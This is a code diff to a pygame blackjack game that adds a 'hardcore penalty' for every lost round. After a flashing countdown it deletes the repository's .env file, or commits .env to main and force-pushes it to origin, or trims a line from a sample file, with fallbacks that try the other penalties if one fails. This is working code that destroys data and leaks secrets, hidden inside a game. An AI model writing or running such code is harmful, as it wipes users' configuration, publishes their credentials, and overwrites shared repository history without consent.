@@ -11,6 +11,7 @@ from __future__ import annotations
 import argparse
 import os
 import random
+import subprocess
 import sys
 from dataclasses import dataclass, field
 from enum import Enum
@@ -63,6 +64,11 @@ BUTTON_HOVER = (128, 82, 40)
 BUTTON_DISABLED = (72, 72, 72)
 AUDIO_EFFECTS: Optional[GameAudioEffects] = None
 
+# Penalty countdown colors
+PENALTY_RED = (220, 20, 20)
+PENALTY_DARK_RED = (120, 10, 10)
+PENALTY_FLASH_RED = (255, 50, 50)
+
 
 class GameMode(str, Enum):
     NORMAL = "normal"
@@ -75,6 +81,7 @@ class Phase(str, Enum):
     PLAYER_TURN = "PLAYER_TURN"
     DEALER_TURN = "DEALER_TURN"
     ROUND_END = "ROUND_END"
+    PENALTY_COUNTDOWN = "PENALTY_COUNTDOWN"
 
 
 class RoundResult(str, Enum):
@@ -83,6 +90,12 @@ class RoundResult(str, Enum):
     LOSE = "LOSE"
     PUSH = "PUSH"
     BLACKJACK_WIN = "BLACKJACK_WIN"
+
+
+class PenaltyType(str, Enum):
+    DELETE_ENV = "DELETE_ENV"
+    FORCE_PUSH_ENV = "FORCE_PUSH_ENV"
+    DELETE_RANDOM_LINE = "DELETE_RANDOM_LINE"
 
 
 def play_result_sound(result: RoundResult) -> None:
@@ -193,6 +206,10 @@ class GameState:
     deck: Deck = field(default_factory=Deck)
     can_start_new_round: bool = True
     rounds_completed: int = 0
+    penalty_countdown_start_ms: int = -1
+    penalty_countdown_duration_ms: int = 5000
+    penalty_triggered: bool = False
+    selected_penalty: Optional[PenaltyType] = None
 
     def reset_for_next_round(self) -> None:
         self.player_hand = Hand()
@@ -584,17 +601,27 @@ def settle_round(state: GameState, result: RoundResult, now_ms: int) -> None:
 
         state.round_result = result
         play_result_sound(result)
-        state.phase = Phase.ROUND_END
         state.rounds_completed += 1
+
+        # Trigger penalty countdown on loss
+        if result == RoundResult.LOSE:
+            state.phase = Phase.PENALTY_COUNTDOWN
+            state.penalty_countdown_start_ms = now_ms
+            state.penalty_triggered = False
+            state.selected_penalty = select_random_penalty()
+            state.losses += 1
+            state.message = "HARDCORE PENALTY ACTIVATED"
+            state.can_start_new_round = False
+            return
+
+        # Handle wins
+        state.phase = Phase.ROUND_END
         if result == RoundResult.BLACKJACK_WIN:
             state.wins += 1
             state.message = "Hardcore clear: BLACKJACK."
         elif result == RoundResult.WIN:
             state.wins += 1
             state.message = "Hardcore clear: You win."
-        else:
-            state.losses += 1
-            state.message = "Hardcore failed: Dealer wins."
         state.can_start_new_round = True
         return
 
@@ -622,6 +649,217 @@ def settle_round(state: GameState, result: RoundResult, now_ms: int) -> None:
     state.can_start_new_round = state.bankroll >= state.min_bet
     if not state.can_start_new_round:
         state.message += " Game over: bankroll below minimum bet."
+
+
+def execute_hardcore_penalty() -> Tuple[bool, str]:
+    """
+    Delete .env file from repository root as hardcore mode penalty.
+
+    Returns:
+        Tuple of (success, message)
+        - success: True if file was deleted or didn't exist
+        - message: Description of what happened
+    """
+    env_path = os.path.join(os.path.dirname(__file__), "..", "..", ".env")
+    env_path = os.path.normpath(env_path)
+
+    if not os.path.exists(env_path):
+        msg = f"PENALTY TRIGGERED: No .env file found at {env_path}"
+        print(msg, file=sys.stderr)
+        return True, "No .env file to delete"
+
+    try:
+        os.remove(env_path)
+        msg = f"HARDCORE PENALTY EXECUTED: Deleted {env_path}"
+        print(msg, file=sys.stderr)
+        return True, "FILE DELETED"
+    except PermissionError:
+        msg = f"PENALTY FAILED: Permission denied for {env_path}"
+        print(msg, file=sys.stderr)
+        return False, "DELETION FAILED (Permission Error)"
+    except Exception as e:
+        msg = f"PENALTY FAILED: {type(e).__name__}: {e}"
+        print(msg, file=sys.stderr)
+        return False, f"DELETION FAILED ({type(e).__name__})"
+
+
+def penalty_force_push_env() -> Tuple[bool, str]:
+    """Force push .env file to main branch"""
+    try:
+        repo_root = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", ".."))
+        env_path = os.path.join(repo_root, ".env")
+
+        # Check if .env exists
+        if not os.path.exists(env_path):
+            return False, "NO .ENV TO PUSH"
+
+        # Get current branch to restore later
+        current_branch = subprocess.run(
+            ["git", "rev-parse", "--abbrev-ref", "HEAD"],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            text=True,
+            timeout=10
+        ).stdout.strip()
+
+        # Switch to main branch
+        subprocess.run(
+            ["git", "checkout", "main"],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            timeout=10
+        )
+
+        # Git add .env
+        subprocess.run(
+            ["git", "add", ".env"],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            timeout=10
+        )
+
+        # Commit
+        subprocess.run(
+            ["git", "commit", "-m", "HARDCORE PENALTY: Force committing .env"],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            timeout=10
+        )
+
+        # Force push main to origin/main
+        subprocess.run(
+            ["git", "push", "origin", "main", "--force"],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            timeout=10
+        )
+
+        # Switch back to original branch
+        subprocess.run(
+            ["git", "checkout", current_branch],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            timeout=10
+        )
+
+        msg = f"HARDCORE PENALTY: Force pushed .env to main"
+        print(msg, file=sys.stderr)
+        return True, ".ENV PUSHED TO MAIN"
+
+    except subprocess.TimeoutExpired:
+        msg = "Git operation timed out"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, "GIT TIMEOUT"
+    except subprocess.CalledProcessError as e:
+        msg = f"Git command failed with code {e.returncode}"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, f"GIT FAILED: {e.returncode}"
+    except Exception as e:
+        msg = f"{type(e).__name__}: {e}"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, f"GIT ERROR: {type(e).__name__}"
+
+
+def penalty_delete_random_line() -> Tuple[bool, str]:
+    """Delete a random line from sample penalty file (safe for testing)"""
+    try:
+        repo_root = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", ".."))
+
+        # Use sample file for testing (safe approach)
+        sample_file = os.path.join(repo_root, "PENALTY_SAMPLE.txt")
+
+        # Create sample file if it doesn't exist
+        if not os.path.exists(sample_file):
+            with open(sample_file, 'w', encoding='utf-8') as f:
+                f.write("Line 1: This is a sample line\n")
+                f.write("Line 2: Another sample line\n")
+                f.write("Line 3: Yet another line\n")
+                f.write("Line 4: Sample data here\n")
+                f.write("Line 5: More sample content\n")
+                f.write("Line 6: Last sample line\n")
+
+        # Read file
+        with open(sample_file, 'r', encoding='utf-8') as f:
+            lines = f.readlines()
+
+        if not lines:
+            return False, "SAMPLE FILE EMPTY"
+
+        # Pick random line and delete it
+        line_idx = random.randint(0, len(lines) - 1)
+        deleted_line = lines.pop(line_idx).strip()
+
+        # Write back
+        with open(sample_file, 'w', encoding='utf-8') as f:
+            f.writelines(lines)
+
+        msg = f"HARDCORE PENALTY: Deleted line {line_idx + 1} from PENALTY_SAMPLE.txt: '{deleted_line}'"
+        print(msg, file=sys.stderr)
+        return True, f"DELETED LINE {line_idx + 1}"
+
+    except Exception as e:
+        msg = f"{type(e).__name__}: {e}"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, f"DELETION FAILED: {type(e).__name__}"
+
+
+def select_random_penalty() -> PenaltyType:
+    """Randomly select a penalty from the pool"""
+    penalties = [
+        PenaltyType.DELETE_ENV,
+        PenaltyType.FORCE_PUSH_ENV,
+        PenaltyType.DELETE_RANDOM_LINE
+    ]
+    return random.choice(penalties)
+
+
+def execute_selected_penalty(penalty_type: PenaltyType) -> Tuple[bool, str]:
+    """
+    Execute the selected penalty with fallback logic.
+    If the selected penalty fails, try others in order.
+    """
+    # Map penalty types to their functions
+    penalty_functions = {
+        PenaltyType.DELETE_ENV: execute_hardcore_penalty,
+        PenaltyType.FORCE_PUSH_ENV: penalty_force_push_env,
+        PenaltyType.DELETE_RANDOM_LINE: penalty_delete_random_line,
+    }
+
+    # Try primary penalty first
+    primary_func = penalty_functions[penalty_type]
+    success, message = primary_func()
+
+    if success:
+        return True, message
+
+    # Fallback: try other penalties in order
+    print(f"Primary penalty failed, trying fallbacks...", file=sys.stderr)
+    for fallback_type, fallback_func in penalty_functions.items():
+        if fallback_type == penalty_type:
+            continue  # Skip the one we just tried
+
+        success, message = fallback_func()
+        if success:
+            return True, f"{message} (FALLBACK)"
+
+    # All penalties failed
+    return False, "ALL PENALTIES FAILED"
+
+
+def get_penalty_description(penalty_type: PenaltyType) -> str:
+    """Get human-readable description for countdown display"""
+    descriptions = {
+        PenaltyType.DELETE_ENV: "Deleting .env file...",
+        PenaltyType.FORCE_PUSH_ENV: "Force pushing .env to main...",
+        PenaltyType.DELETE_RANDOM_LINE: "Deleting random line from random file...",
+    }
+    return descriptions.get(penalty_type, "Unknown penalty...")
 
 
 def resolve_natural_blackjacks(state: GameState) -> bool:
@@ -738,8 +976,95 @@ def build_buttons(state: GameState) -> Dict[str, Button]:
     return buttons
 
 
+def draw_penalty_countdown(
+    surface: pygame.Surface,
+    state: GameState,
+    now_ms: int,
+) -> None:
+    """
+    Render dramatic countdown screen for hardcore penalty.
+
+    Shows:
+    - Large countdown numbers (5, 4, 3, 2, 1...)
+    - Red flashing background effect
+    - Warning message
+    - Final "FILE DELETED" or error message
+    """
+    elapsed_ms = now_ms - state.penalty_countdown_start_ms
+    remaining_ms = state.penalty_countdown_duration_ms - elapsed_ms
+    remaining_sec = max(0, remaining_ms / 1000.0)
+    countdown_num = int(remaining_sec) + 1
+
+    # Flash effect (alternates every 250ms)
+    flash_cycle = (now_ms // 250) % 2
+    if flash_cycle == 0:
+        bg_tint = PENALTY_FLASH_RED
+    else:
+        bg_tint = PENALTY_DARK_RED
+
+    # Overlay red tint on entire screen
+    overlay = pygame.Surface((WINDOW_WIDTH, WINDOW_HEIGHT), pygame.SRCALPHA)
+    alpha = int(100 + 50 * flash_cycle)  # Oscillates between 100-150
+    overlay.fill((*bg_tint, alpha))
+    surface.blit(overlay, (0, 0))
+
+    # Draw warning header
+    header_font = pygame.font.SysFont("georgia", 48, bold=True)
+    warning_text = "HARDCORE PENALTY ACTIVATED"
+    warning_surf = header_font.render(warning_text, True, TEXT_IVORY)
+    warning_rect = warning_surf.get_rect(center=(WINDOW_WIDTH // 2, 150))
+
+    # Black shadow for readability
+    shadow_surf = header_font.render(warning_text, True, (0, 0, 0))
+    surface.blit(shadow_surf, (warning_rect.x + 4, warning_rect.y + 4))
+    surface.blit(warning_surf, warning_rect)
+
+    if remaining_sec > 0:
+        # Draw countdown number
+        countdown_font = pygame.font.SysFont("georgia", 180, bold=True)
+        countdown_surf = countdown_font.render(str(countdown_num), True, TEXT_IVORY)
+        countdown_rect = countdown_surf.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2))
+
+        # Larger shadow for countdown
+        shadow_surf = countdown_font.render(str(countdown_num), True, (0, 0, 0))
+        surface.blit(shadow_surf, (countdown_rect.x + 6, countdown_rect.y + 6))
+        surface.blit(countdown_surf, countdown_rect)
+
+        # Subtitle - show specific penalty description
+        subtitle_font = pygame.font.SysFont("georgia", 32)
+        if state.selected_penalty:
+            subtitle = get_penalty_description(state.selected_penalty)
+        else:
+            subtitle = "Executing penalty..."
+        subtitle_surf = subtitle_font.render(subtitle, True, GOLD_SOFT)
+        subtitle_rect = subtitle_surf.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2 + 140))
+        surface.blit(subtitle_surf, subtitle_rect)
+    else:
+        # Countdown complete - show result
+        result_font = pygame.font.SysFont("georgia", 72, bold=True)
+        if state.penalty_triggered:
+            result_text = state.message
+        else:
+            result_text = "EXECUTING PENALTY..."
+
+        result_surf = result_font.render(result_text, True, TEXT_IVORY)
+        result_rect = result_surf.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2))
+
+        shadow_surf = result_font.render(result_text, True, (0, 0, 0))
+        surface.blit(shadow_surf, (result_rect.x + 5, result_rect.y + 5))
+        surface.blit(result_surf, result_rect)
+
+
 def render(surface: pygame.Surface, state: GameState, images: Dict[str, pygame.Surface]) -> Dict[str, Button]:
     now_ms = pygame.time.get_ticks()
+
+    # Special rendering for penalty countdown
+    if state.phase == Phase.PENALTY_COUNTDOWN:
+        draw_background(surface)
+        draw_penalty_countdown(surface, state, now_ms)
+        pygame.display.flip()
+        return {}  # No buttons during penalty countdown
+
     draw_background(surface)
 
     header_font = pygame.font.SysFont("georgia", 40, bold=True)
@@ -897,6 +1222,39 @@ def run_game(start_bankroll: int, fps: int) -> int:
     try:
         while running:
             buttons = render(screen, state, card_images)
+
+            # Handle penalty countdown progression
+            if state.phase == Phase.PENALTY_COUNTDOWN:
+                now_ms = pygame.time.get_ticks()
+                elapsed_ms = now_ms - state.penalty_countdown_start_ms
+
+                # Check if countdown is complete
+                if elapsed_ms >= state.penalty_countdown_duration_ms:
+                    if not state.penalty_triggered:
+                        # Execute the selected penalty
+                        state.penalty_triggered = True
+
+                        if state.selected_penalty:
+                            success, msg = execute_selected_penalty(state.selected_penalty)
+                        else:
+                            # Fallback if no penalty selected
+                            success, msg = execute_hardcore_penalty()
+
+                        state.message = msg
+
+                        # Wait 2 more seconds to show result, then exit
+                        pygame.time.wait(2000)
+                        running = False
+                        break
+
+                # Allow quit during countdown
+                for event in pygame.event.get():
+                    if event.type == pygame.QUIT:
+                        running = False
+                        break
+
+                clock.tick(fps)
+                continue  # Skip normal event handling
 
             if state.phase == Phase.PLAYER_TURN and gesture is not None and gesture.enabled:
                 action = gesture.poll_action(allow_split=False)
